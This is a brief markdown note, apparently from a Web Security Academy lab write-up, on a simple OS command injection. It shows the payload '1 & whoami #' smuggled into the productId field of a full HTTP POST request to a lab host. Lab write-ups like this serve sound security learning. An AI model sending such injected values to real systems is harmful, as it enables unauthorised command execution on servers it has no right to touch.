## Command Injection Test Cases
### OS command injection, simple case
In POST request, product ID parameter is vulnerable to RCE.<br>
Payload: 1 & whoami #
```
POST /product/stock HTTP/2
Host: 0ac90059032173378055ea7e00580038.web-security-academy.net

productId=1+%26+whoami+%23&storeId=1
```
